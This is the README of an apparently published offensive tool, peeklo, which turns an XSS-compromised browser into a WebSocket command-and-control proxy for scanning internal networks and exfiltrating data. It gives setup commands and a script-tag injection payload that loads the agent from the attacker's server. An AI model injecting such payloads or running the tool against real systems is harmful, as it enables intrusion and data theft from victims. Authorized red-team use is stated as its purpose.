# peeklo

**Version:** v1.0

peeklo is a browser-based XSS-powered C2 (Command and Control) tool that leverages the victim’s browser as a stealthy proxy inside internal networks.

Through an injected XSS payload, peeklo establishes a WebSocket connection to a central server, allowing an attacker to remotely control the victim’s browser to send requests to internal services, scan networks, and exfiltrate data — all without dropping a single binary.

---

## Features

- WebSocket-based communication between attacker and multiple victims  
- Victim’s browser fetches internal URLs and scans IP ranges + ports  
- Simple control panel with:  
  - Victim selector  
  - Manual URL fetch  
  - IP and port range scanner  
  - Log viewer with copy/save functionality  
- Self-signed HTTPS support with auto-generated certificates  
- Lightweight: single Python file + static assets  

---

## Requirements

- Python 3.8+  
- OpenSSL  
- Linux/macOS (tested on Debian-based systems)  

---

## Quick Start

1. Clone the repository:

    ```bash
    git clone https://github.com/b3rito/peeklo.git
    cd peeklo
    ```

2. Install dependencies:

    ```bash
    make install
    ```

3. Generate a self-signed TLS certificate:

    ```bash
    make cert
    ```

4. Run the server:

    ```bash
    make run
    ```

5. Open your browser and access the control panel:

    ```
    https://<your-ip>:8443/static/control.html
    ```

6. Inject the XSS payload (example):

    ```html
    <script src="https://<your-ip>:8443/static/agent.js"></script>
    ```

    Or embed `infect.html` as needed depending on the vulnerability.

---

## Usage

### Control Panel

- Choose a connected victim from the dropdown  
- Input a manual URL to fetch via the victim  
- Specify an IP range (e.g. `192.168.1.10-20` or `192.168.1.0/24`) and ports (e.g. `80,8080,3000-3010`) to scan  
- Results will appear in the log viewer:  
  - HTTP status  
  - Body preview 
- You can copy the log or save it as `.txt` or `.json`  

---

## Project Structure

```
peeklo/
├── main.py             → FastAPI WebSocket server  
├── start.sh            → Launch server  
├── gen-cert.sh         → Generate self-signed TLS certificate  
├── Makefile            → Install/run helpers  
├── requirements.txt    → Python dependencies  
├── certs/              → TLS key and cert will be stored here  
└── static/             → Browser client assets  
    ├── control.html    → Control panel (was attacker.html)  
    ├── infect.html     → Victim landing page  
    └── agent.js        → Victim agent script  
```

---

## Workflow

1. Inject the payload into a vulnerable web application  
2. Victim’s browser loads the agent and connects to your peeklo server  
3. From the control panel, you issue commands to fetch URLs or scan targets  
4. peeklo logs and returns the content of internal services  

---

## Use Cases

- Internal network exploration through browser footholds  
- LAN service enumeration from inside the victim’s network   

---

## Disclaimer

This tool is provided for educational and authorized testing purposes only.  
Any use of peeklo outside of environments where you have explicit permission is **strictly prohibited**.  
You are responsible for your own actions.

---

## Authors

- **b3rito** – [https://github.com/b3rito](https://github.com/b3rito)  
- **GioPpeTto**
